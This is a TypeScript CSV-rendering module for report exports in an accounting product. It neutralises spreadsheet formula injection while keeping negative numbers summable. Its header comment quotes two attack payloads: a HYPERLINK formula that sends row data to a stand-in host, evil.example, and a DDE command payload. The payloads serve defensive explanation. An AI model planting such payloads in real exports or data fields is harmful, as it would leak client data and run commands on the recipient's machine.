/**
 * CSV rendering for report exports.
 *
 * RFC 4180 quoting, and one thing RFC 4180 says nothing about:
 *
 * ---------------------------------------------------------------------------
 * FORMULA INJECTION. A CSV EXPORT IS A PROGRAM SPREADSHEETS WILL RUN.
 *
 * A cell whose text begins with `=`, `+`, `@`, or a control character is
 * interpreted by Excel, LibreOffice and Google Sheets as a FORMULA, not as
 * text. So a contact named
 *
 *     =HYPERLINK("https://evil.example/"&A1,"Click for invoice")
 *
 * — a value any user can type into a customer name field, and which this system
 * will faithfully store and faithfully export — becomes a live link in the
 * accountant's spreadsheet, populated with data from the row it sits in.
 * `=cmd|'/c calc'!A1` is the same trick aimed at DDE.
 *
 * This is not theoretical for an accounting product: exports are the main way
 * data leaves it, and the person opening the file is an accountant with the
 * whole client's books on the same machine. Every exported cell is therefore
 * neutralised at the point of rendering, where it cannot be forgotten, rather
 * than at each of the call sites that will keep multiplying.
 *
 * The guard is a leading apostrophe, which spreadsheets treat as "the rest is
 * text" and do not display as content.
 *
 * NEGATIVE NUMBERS ARE THE EXCEPTION THAT MAKES THE NAIVE FIX WRONG. The usual
 * advice is to guard anything starting with `-`, which would turn every credit
 * balance in an accounting export into the text `'-1500.00` — unsummable, and
 * therefore a fix that breaks the file's actual purpose. So a leading `-` is
 * guarded only when what follows is not a number.
 * ---------------------------------------------------------------------------
 */

/** Characters that make a spreadsheet treat a cell as something other than text. */
const DANGEROUS_PREFIX = /^[=+@\t\r]/;

/** A plain decimal, with or without a sign — safe, and must stay a number. */
const NUMERIC = /^[-+]?\d+(\.\d+)?$/;

export function escapeCsvCell(value: string): string {
  // `+1500.00` and `-1500.00` are numbers, not formulas. Everything else that
  // opens with a dangerous character is neutralised.
  const needsGuard = DANGEROUS_PREFIX.test(value)
    ? !NUMERIC.test(value)
    : value.startsWith('-') && !NUMERIC.test(value);

  const guarded = needsGuard ? `'${value}` : value;

  // RFC 4180: quote if the cell contains a delimiter, a quote or a newline;
  // double any embedded quote. A guarded cell is quoted too, so the apostrophe
  // cannot be mistaken for part of a delimiter-separated token.
  return /[",\r\n]/.test(guarded) || needsGuard
    ? `"${guarded.replace(/"/g, '""')}"`
    : guarded;
}

export interface CsvOptions {
  /**
   * Emit a UTF-8 byte order mark.
   *
   * Excel on Windows reads a BOM-less UTF-8 CSV as the legacy code page, which
   * mangles every non-ASCII character — and Malaysian contact names routinely
   * contain them (Nurul A'in, Lim Wei Sheng 林伟胜, a/l and a/p in full names).
   * Defaults on for that reason.
   */
  readonly bom?: boolean;
}

/** Render rows to CSV. CRLF line endings, per RFC 4180. */
export function toCsv(
  rows: readonly (readonly string[])[],
  options: CsvOptions = {},
): string {
  const body = rows.map((row) => row.map(escapeCsvCell).join(',')).join('\r\n');
  const trailing = rows.length > 0 ? '\r\n' : '';
  return `${options.bom === false ? '' : '﻿'}${body}${trailing}`;
}
